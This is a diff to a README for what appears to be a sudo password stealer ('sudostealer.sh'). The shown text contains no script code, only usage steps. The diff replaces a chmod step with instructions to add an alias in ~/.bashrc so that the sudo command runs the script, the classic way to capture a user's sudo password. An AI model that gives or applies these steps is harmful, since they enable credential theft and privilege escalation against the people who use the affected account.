@@ -7,8 +7,8 @@
 
 To use the script follow these steps:
 
-Make it executeable:
-```chmod +x sudostealer.sh```
-
+In the .bashrc File:
+```~/.bashrc```
+Add the following to create an alias for sudo
 Create an alias:
 ```alias sudo="/PathToFile/sudostealer.sh"```
